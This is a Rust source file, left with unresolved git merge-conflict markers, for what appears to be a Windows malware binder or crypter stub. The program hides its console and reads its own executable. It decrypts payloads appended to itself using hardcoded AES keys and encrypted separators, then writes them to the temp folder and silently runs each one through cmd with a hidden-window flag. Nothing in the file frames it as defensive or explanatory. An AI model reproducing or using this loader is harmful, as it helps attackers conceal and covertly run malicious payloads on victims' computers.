#![windows_subsystem = "windows"]

<<<<<<< HEAD
mod crypter;
=======
mod crypto;
>>>>>>> 1c5ff11e712ee8d2f37f6406db1e84b7ca75683c

use std::io::Read;
use std::os::windows::process::CommandExt;
use std::fs;

fn main() {
    // read self bytes,
    // then find seperator
<<<<<<< HEAD
    let key: [u8; 32] = [239, 39, 152, 9, 150, 12, 250, 189, 213, 50, 40, 58, 108, 102, 200, 138, 222, 213, 47, 3, 107, 4, 47, 80, 169, 41, 212, 121, 139, 175, 214, 29];
    let iv: [u8; 16] = [136, 165, 117, 219, 181, 24, 7, 110, 151, 155, 142, 28, 142, 88, 64, 9];

    let selfile = match fs::read(std::env::current_exe().unwrap_or("".into())) {
=======
    let selfile = match std::fs::read(std::env::current_exe().unwrap()) {
>>>>>>> 1c5ff11e712ee8d2f37f6406db1e84b7ca75683c
        Ok(file) => {
            file
        }
        Err(e) => {
            return
        }
    };

    // find seperator
    let mut str = String::from_utf8_lossy(selfile.as_slice());
    let mut name_extension = Vec::new();
    let mut files= Vec::new();
<<<<<<< HEAD

    // fix seperator
    let fix_seperator = &base64::encode(crypter::encrypt("♠●☆♠♠●☆♠●☆●♠♠●☆♠●☆●☆☆".as_bytes(), &key, &iv).unwrap());

    let mut sep_splits = str.split(fix_seperator);
    let key_hint = crypter::decrypt(&base64::decode(sep_splits.clone().nth(1).unwrap()).unwrap(), &key, &iv).unwrap();
    let sep_hint = crypter::decrypt(&base64::decode(sep_splits.clone().nth(2).unwrap()).unwrap(), &key, &iv).unwrap();

    let real_sep = &base64::encode(crypter::encrypt(sep_hint.as_slice(), &key_hint, &iv).unwrap());

    let splits = &str.split(real_sep);
    for i in 1..splits.clone().count() {
        let splits = splits.clone().collect::<Vec<&str>>();

        let bytes = crypter::decrypt(&base64::decode(splits[i]).unwrap(), &key_hint, &iv).unwrap();
=======
    let seperator = &base64::encode("쟑맯됽뱫뷵");
    for i in 1..str.split(seperator).count() {
        let splits = str.split(seperator).collect::<Vec<&str>>();
        let bytes = base64::decode(splits[i]).unwrap();
>>>>>>> 1c5ff11e712ee8d2f37f6406db1e84b7ca75683c
        if i % 2 == 1 {
            name_extension.push(String::from_utf8(bytes.clone()).unwrap());
        } else {
            files.push(bytes.clone());
        }
    }

    for i in 0..files.len() {
        let f = &files[i];
        std::fs::write(std::env::temp_dir().join(format!("{}{}.{}", std::env::current_exe().unwrap().file_name().unwrap().to_string_lossy(), i, name_extension[i])), f);
        std::process::Command::new("cmd")
            .creation_flags(0x08000000)
            .arg("/c")// hide flags
            .raw_arg(format!("\"{}\"", std::env::temp_dir().join(format!("{}{}.{}", std::env::current_exe().unwrap().file_name().unwrap().to_string_lossy(), i, name_extension[i])).to_string_lossy()))
            .spawn();
    }
}
